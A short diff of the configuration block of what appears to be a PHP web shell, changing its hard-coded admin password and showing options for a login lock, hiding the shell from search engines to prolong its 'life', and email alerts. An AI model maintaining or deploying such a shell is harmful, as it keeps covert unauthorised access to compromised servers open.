@@ -79,7 +79,7 @@ if(isset($_GET['zip'])) {
 
 $greeting 		= "0x xx Welcome Young Warrior xx x0";
 $user 			= "admin";
-$pass 			= "12345687";
+$pass 			= "12345678";
 $lock 			= "on"; // set this to off if you dont need the login page
 $antiCrawler 		= "off"; // set this to on if u dont want your shell to be publicised in Search Engines ! (It increases the shell's Life')
 $tracebackFeature 	= "on"; // set this feature to on to enable email alerts
